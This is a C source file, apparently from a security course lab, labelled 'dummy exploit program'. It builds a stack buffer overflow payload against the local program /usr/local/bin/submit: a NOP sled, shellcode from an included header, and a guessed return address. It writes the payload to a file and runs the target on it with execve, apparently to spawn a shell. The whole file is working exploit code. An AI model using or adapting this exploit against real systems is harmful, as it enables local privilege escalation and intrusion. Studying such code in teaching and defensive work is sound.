/*
 * dummy exploit program
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/usr/local/bin/submit"



#define DEFAULT_OFFSET                  500
#define DEFAULT_BUFFER_SIZE            1124
#define NOP                            0x90

unsigned long get_sp(void) {
   __asm__("movl %esp,%eax");
}

int main(int argc, char *argv[]) {
  FILE *hackfile;
  char *buff, *ptr, *args[4], *env[1];
  long *addr_ptr, addr;
  int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
  int i;
  

  if (argc > 1) bsize  = atoi(argv[1]);
  if (argc > 2) offset = atoi(argv[2]);

  if (!(buff = malloc(bsize))) {
    printf("Can't allocate memory.\n");
    exit(0);
  }

  addr = 0xffbfde4c - offset;
  printf("Using address: 0x%x\n", addr);

  ptr = buff;
  addr_ptr = (long *) ptr;
  for (i = 0; i < bsize; i+=4)
    *(addr_ptr++) = addr;

  for (i = 0; i < bsize/2; i++)
    buff[i] = NOP;

  ptr = buff + ((bsize/2) - (strlen(shellcode)/2));
  for (i = 0; i < strlen(shellcode); i++)
    *(ptr++) = shellcode[i];

  buff[bsize - 1] = '\0';
  system("echo \"\" > crap");
  hackfile = fopen("crap","w");
  
  if (hackfile == NULL){
    fprintf(stderr,"cannot open crap\n");
    exit(1);
  }
  
  for (i=0;i<bsize;i++) {
    //fprintf(hackfile,"%c",buff[i]);
    fputc(buff[i], hackfile);
  }
  fclose(hackfile);
  
  //system("rm crap");
  
  args[0] = TARGET; args[1] = "crap"; 
  args[2] = "message"; args[3] = NULL;

  env[0] = NULL;

  if (execve(TARGET, args, env) < 0)
    fprintf(stderr, "execve failed.\n");
    
  return 0;
}
